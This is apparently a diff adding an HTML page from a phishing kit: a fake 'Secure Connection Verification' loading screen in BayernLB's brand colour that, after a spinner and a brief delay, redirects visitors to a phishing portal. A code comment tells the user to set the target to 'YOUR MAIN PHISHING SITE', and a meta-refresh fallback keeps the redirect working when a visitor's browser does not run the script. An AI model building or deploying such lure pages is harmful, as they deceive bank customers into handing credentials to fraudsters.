@@ -1,0 +1,104 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Connection Verification</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f6f9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .loader-container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #e1e1e1;
+            border-top: 5px solid #003366; /* BayernLB Blue */
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 0;
+        }
+
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #28a745;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <h2>Verifying Secure Connection...</h2>
+        <p>Establishing encrypted link to server.</p>
+        <div id="status-msg" class="status">Redirecting...</div>
+    </div>
+
+    <script>
+        // CONFIGURATION: CHANGE THIS URL TO YOUR MAIN PHISHING SITE
+        // Example: 'https://your-main-domain.com/'
+        const TARGET_URL = 'portal.html'; 
+
+        // Time to wait before redirect (in milliseconds)
+        const WAIT_TIME = 2500; 
+
+        // Optional: Show "Redirecting" text after 1 second
+        setTimeout(() => {
+            document.getElementById('status-msg').style.display = 'block';
+        }, 1000);
+
+        // Perform the redirect after the wait time
+        setTimeout(() => {
+            window.location.href = TARGET_URL;
+        }, WAIT_TIME);
+
+        // Fallback for bots (if they don't execute JS immediately)
+        // This meta tag forces a redirect if JS fails
+        // Note: We use a short delay to avoid "Too many redirects" errors
+        const metaRefresh = document.createElement('meta');
+        metaRefresh.httpEquiv = "refresh";
+        metaRefresh.content = "3;url=" + TARGET_URL;
+        document.head.appendChild(metaRefresh);
+    </script>
+
+</body>
+</html>
